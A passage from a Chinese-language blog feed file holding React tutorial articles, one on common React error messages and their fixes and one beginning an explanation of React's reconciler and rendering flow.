class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;data.map((content) =&gt; (</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">key</span>=<span class="string">&#123;content.id&#125;</span> <span class="attr">className</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">Card</span> <span class="attr">text</span>=<span class="string">&#123;content.text&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      ))&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />尽管不遵守这个要求也不会导致应用崩溃，但它可能会导致一些意外的情况。React 会使用这些 key 来确定列表中的哪些子项发生了更改，并使用此信息来确定可以重用先前 DOM 的哪些部分，以及在重新渲染组件时应该重新计算哪些部分。 因此，建议添加 key。</p><p><a name="g5c8W"></a></p><h2 id="3-Hooks-调用顺序错误"><a href="#3-Hooks-调用顺序错误" class="headerlink" title="3. Hooks 调用顺序错误"></a>3. Hooks 调用顺序错误</h2><p><strong>报错信息：</strong><code>React Hook &quot;useXXX&quot; is called conditionally. React Hooks must be called in the exact same order in every component render</code></p><p>先来看下面的代码：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Toggle</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [isOpen, setIsOpen] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isOpen) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;/* ... */&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> openToggle = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> <span class="title function_">setIsOpen</span>(<span class="literal">true</span>), []);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;openToggle&#125;</span>&gt;</span>&#123;/* ... */&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />当 <code>isOpen</code> 的值为<code>true</code>时，就会直接<code>return</code>那个<code>div</code>元素。这样当<code>isOpen</code>的值为<code>true</code>和<code>false</code>时<code>useCallback Hook</code>的调用顺序就不一致了。这时 React 就会警告我们：<code>React Hook &quot;useCallback&quot; is called conditionally. React Hooks must be called in the exact same order in every component render</code>。这其实就是 React 官方文档中所说的，<strong>不要在循环，条件或嵌套函数中调用 Hook， 确保总是在 React 函数的最顶层以及任何 return 之前调用他们</strong>。遵守这条规则才能确保 Hook 在每一次渲染中都按照同样的顺序被调用。</p><p>可以这样来修改上面的代码：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Toggle</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [isOpen, setIsOpen] = <span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line">  <span class="keyword">const</span> openToggle = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> <span class="title function_">setIsOpen</span>(<span class="literal">true</span>), []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isOpen) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;/* ... */&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;openToggle&#125;</span>&gt;</span>&#123;/* ... */&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="H0So3"></a></p><h2 id="4-useEffect-缺少依赖"><a href="#4-useEffect-缺少依赖" class="headerlink" title="4. useEffect 缺少依赖"></a>4. useEffect 缺少依赖</h2><p><strong>报错信息：</strong><code>React Hook useEffect has a missing dependency: &#39;XXX&#39;. Either include it or remove the dependency array</code></p><p>先来看看 React 官网给出的例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params">&#123; someProp &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(someProp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">doSomething</span>();</span><br><span class="line">  &#125;, []);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>useEffect</code>中定义空的依赖数组是不安全，因为它调用的 <code>doSomething</code> 函数使用了 <code>someProp</code>。这时就会报错：<code>React Hook useEffect has a missing dependency: &#39;XXX&#39;. Either include it or remove the dependency array</code><strong>。</strong>当<code>props</code>中的<code>someProp</code>发生变化时，函数<code>doSomething</code>的结果就会发生变化，然而<code>useEffect</code>的依赖数组为空，所以就不会执行回调中的内容。</p><p>有两种方式来解决这个问题：<br />● 在<code>useEffect</code>中声明其所需函数，这种方式适用于只需要调用一次的函数，比如初始化函数：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params">&#123; someProp &#125;</span>) &#123;</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(someProp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">doSomething</span>();</span><br><span class="line">  &#125;, [someProp]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />● 使用<code>useCallback</code>来定义依赖项，确保当自身依赖发生改变时函数主体也会改变：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params">&#123; someProp &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> doSomething = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(someProp);</span><br><span class="line">  &#125;, [someProp])</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">doSomething</span>();</span><br><span class="line">  &#125;, [doSomething]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="H2EaL"></a></p><h2 id="5-重新渲染过多"><a href="#5-重新渲染过多" class="headerlink" title="5. 重新渲染过多"></a>5. 重新渲染过多</h2><p><strong>报错信息：</strong><code>Too many re-renders. React limits the number of renders to prevent an infinite loop</code></p><p>这个报错就是说重新渲染过多。React 限制渲染的数量以防止无限循环。当组件在很短的时间有太多状态更新时，就可能会发生这种情况。导致无限循环的最常见原因是：<br />● 直接在渲染中执行状态更新；<br />● 未向事件处理程序提供适当的回调。</p><p>如果遇到这个警告，可以检查组件的这两个方面：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>); <span class="comment">// 渲染中的状态更新</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;/* onClick 没有正确的回调 */&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;setCount((prevCount)</span> =&gt;</span> prevCount + 1)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">        Increment that counter</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="KptAg"></a></p><h2 id="6-渲染的单条数据为对象"><a href="#6-渲染的单条数据为对象" class="headerlink" title="6. 渲染的单条数据为对象"></a>6. 渲染的单条数据为对象</h2><p><strong>报错信息：</strong><code>Objects are not valid as a React child / Functions are not valid as a React child</code></p><p>在 React 中，我们可以在组件中渲染到 DOM 中的东西有很多，比如：HTML 标签、JSX 元素、原始 JavaScript 值、JavaScript 表达式等。但是不能将对象和函数渲染到 DOM 中，因为这两个值不会解析为有意义的值，如果渲染了对象或函数，就会报上面的错误。解决这个问题的方法很简单，就是检查渲染的内容是否是有效的值：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params">&#123; body &#125;</span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;/* */&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    &#123;/* 必须确保 body 是有效的 React child */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;body&quot;</span>&gt;</span>&#123;body&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="mMvyi"></a></p><h2 id="7-相邻-JSX-元素没有包装在封闭标记中"><a href="#7-相邻-JSX-元素没有包装在封闭标记中" class="headerlink" title="7. 相邻 JSX 元素没有包装在封闭标记中"></a>7. 相邻 JSX 元素没有包装在封闭标记中</h2><p><strong>报错信息：</strong><code>Adjacent JSX elements must be wrapped in an enclosing tag</code></p><p>这个报错就是说相邻 JSX 元素必须包装在封闭标记中，也就是必须要有一个根元素：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Nice</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Bad</span> /&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>从 React 开发人员的角度来看，这个组件只会在另一个组件内部使用。 因此，在他们的心智模型中，从一个组件返回两个元素是有意义的，因为生成的 DOM 结构将是相同的，无论外部元素是在此组件中定义还是在父组件中定义。但是，React 无法做出这种假设。该组件可能会在根目录中使用并破坏应用，因为它会导致无效的 DOM 结构。</p><p>所以，应该始终将组件返回的多个 JSX 元素包装在一个封闭标记中。可以是一个元素、一个组件或者 React Fragment：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Nice</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Bad</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><br />或者直接使用一个空标签来包装两个 JSX 元素：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Component</span> = (<span class="params"></span>) =&gt; (</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">Nice</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">Bad</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="XFy4C"></a></p><h2 id="8-使用旧的状态"><a href="#8-使用旧的状态" class="headerlink" title="8. 使用旧的状态"></a>8. 使用旧的状态</h2><p>先来看一个计数器的例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Increaser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> increase = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>handleClick</code>方法会在点击按钮后执行三次增加状态变量<code>count</code>的操作。那么点击一次是否会增加 3 呢？事实并非如此。点击按钮之后，<code>count</code>只会增加 1。问题就在于，当我们点击按钮时，相当于下面的操作：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">  <span class="title function_">setCount</span>(count + <span class="number">1</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当第一次调用<code>setCount(count + 1)</code>时是没有问题的，它会将<code>count</code>更新为 1。接下来第 2、3 次调用<code>setCount</code>时，<code>count</code>还是使用了旧的状态（<code>count</code>为 0），所以也会计算出<code>count</code>为 1。发生这种情况的原因就是状态变量会在下一次渲染才更新。</p><p>解决这个问题的办法就是，<strong>使用函数的方式来更新状态：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Increaser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> increase = <span class="title function_">useCallback</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">setCount</span>(<span class="function"><span class="params">count</span> =&gt;</span> count + <span class="number">1</span>);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">handleClick</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">    <span class="title function_">increase</span>();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;handleClick&#125;</span>&gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样改完之后，React 就能拿到最新的值，当点击按钮时，就会每次增加 3。所以需要记住：<strong>如果要使用当前状态来计算下一个状态，就要使用函数的式方式来更新状态：</strong></p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">setValue</span>(<span class="function"><span class="params">prevValue</span> =&gt;</span> prevValue + someResult)</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 渲染流程</title>
      <link href="/2023/07/28/frontend/react/react-xuan-ran-liu-cheng/"/>
      <url>/2023/07/28/frontend/react/react-xuan-ran-liu-cheng/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="WjTXE"></a></p><h2 id="1-React-渲染流程"><a href="#1-React-渲染流程" class="headerlink" title="1. React 渲染流程"></a>1. React 渲染流程</h2><p>在说 React 的渲染流程之前，先来看一个在渲染流程中绝对绕不开的概念——<strong>协调</strong>。</p><p><a name="fab8p"></a></p><h3 id="（1）协调"><a href="#（1）协调" class="headerlink" title="（1）协调"></a>（1）协调</h3><p>协调，在 React 官方博客的原文中是 <code>Reconciler</code>，它的本意是“和解者，调解员”。那协调是怎么跟 React 扯上关系的呢？React 官方文档在介绍协调时，是这样说的：</p><blockquote><p>React 提供的声明式 API 让开发者可以在对 React 的底层实现没有具体了解的情况下编写应用。在开发者编写应用时虽然保持相对简单的心智，但开发者无法了解内部的实现机制。本文描述了在实现 React 的 “diffing” 算法中我们做出的设计决策以保证组件满足更新具有可预测性，以及在繁杂业务下依然保持应用的高性能性。</p></blockquote><p>可以看出，Reconciler 是协助 React 确认状态变化时要更新哪些 DOM 元素的 diff 算法，这看上去确实有点儿调解员的意思，这是狭义上的 Reconciler。</p><p>而在 React 源码中还有一个叫作 <code>reconcilers</code> 的模块，它通过抽离公共函数与 diff 算法使声明式渲染、自定义组件、state、生命周期方法和 refs 等特性实现跨平台工作。</p><p>Reconciler 模块以 React 16 为分界线分为两个版本。<br />● Stack Reconciler 是 React 15 及以前版本的渲染方案，其核心是以递归的方式逐级调度栈中子节点到父节点的渲染。<br />● Fiber Reconciler 是 React 16 及以后版本的渲染方案，它的核心设计是增量渲染（incremental rendering），也就是将渲染工作分割为多个区块，并将其分散到多个帧中去执行。它的设计初衷是提高 React 在动画、画布及手势等场景下的性能表现。</p><p><a name="ELQTw"></a></p><h3 id="（2）渲染"><a href="#（2）渲染" class="headerlink" title="（2）渲染"></a>（2）渲染</h3><p>为了更好地理解两者之间的差异，下面先来看看 Stack Reconciler。</p><p>Stack Reconciler 没有单独的包，并没有像 Fiber Reconclier 一样抽取为独立的 React-Reconciler 模块。但这并不妨碍它成为一个经典的设计。在 React 的官方文档中，是通过伪代码的形式介绍其实现方案的。</p><p><a name="la8v3"></a></p><h3 id="（3）挂载"><a href="#（3）挂载" class="headerlink" title="（3）挂载"></a>（3）挂载</h3><p>这里的挂载与生命周期中的挂载不同，它是将整个 React 挂载到 <code>ReactDOM.render</code> 之上，就像以下代码中的 App 组件挂载到 root 节点上一样。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">      )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>, <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>))</span><br></pre></td></tr></table></figure><p><br />JSX 会被 Babel 编译成 <code>React.creatElemnt</code> 的形式：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(<span class="title class_">React</span>.<span class="title function_">creatElement</span>(<span class="title class_">App</span>), <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>))</span><br></pre></td></tr></table></figure><p><br />这项工作发生在<strong>本地的 Node 进程</strong>中，而不是通过浏览器中的 React 完成的。<code>ReactDOM.render </code>调用之后，实际上是**透传参数给 **<code>**ReactMount.render**</code>。<br />● <code>ReactDOM</code> 是对外暴露的模块接口；<br />● <code>ReactMount</code> 是实际执行者，完成初始化 React 组件的整个过程。</p><p>初始化第一步就是通过 <code>React.creatElement</code> 创建 React Element。不同的组件类型会被构建为不同的 Element：<br />● App 组件会被标记为 type function，作为用户自定义的组件，被 <code>ReactComponentsiteComponent</code> 包裹一次，生成一个对象实例；<br />● div 标签作为 React 内部的已知 DOM 类型，会实例化为 <code>ReactDOMComponent</code>；<br />● “Hello World” 会被直接判断是否为字符串，实例化为 <code>ReactDOMComponent</code>。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612866003096-c86d7836-73f3-439e-b718-3cbe1e94605e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1612866003096-c86d7836-73f3-439e-b718-3cbe1e94605e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这段逻辑在 React 源码中大致是这样的，其中 <code>isInternalComponentType</code> 就是判断当前的组件是否为内部已知类型。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> element.<span class="property">type</span> === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">    instance = <span class="title class_">ReactHostComponent</span>.<span class="title function_">createInternalComponent</span>(element);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isInternalComponentType</span>(element.<span class="property">type</span>)) &#123;</span><br><span class="line">    instance = <span class="keyword">new</span> element.<span class="title function_">type</span>(element);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    instance = <span class="keyword">new</span> <span class="title class_">ReactCompositeComponentWrapper</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />到这里仅仅完成了实例化，还需要与 React 产生一些联动，比如改变状态、更新界面等。在状态变更后，涉及一个变更收集再批量处理的过程。在这里 <code>ReactUpdates</code> 模块就专门用于批量处理，而批量处理的前后操作，是由 React 通过建立事务的概念来处理的。</p><p>React 事务都是基于 <code>Transaction</code> 类继承拓展。每个 Transaction 实例都是一个封闭空间，保持不可变的任务常量，并提供对应的事务处理接口 。一段事务在 React 源码中大致是这样的：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mountComponentIntoNode</span>: <span class="keyword">function</span>(<span class="params">rootID, container</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> transaction = <span class="title class_">ReactComponent</span>.<span class="property">ReactReconcileTransaction</span>.<span class="title function_">getPooled</span>();</span><br><span class="line">      transaction.<span class="title function_">perform</span>(</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_mountComponentIntoNode</span>,</span><br><span class="line">        <span class="variable 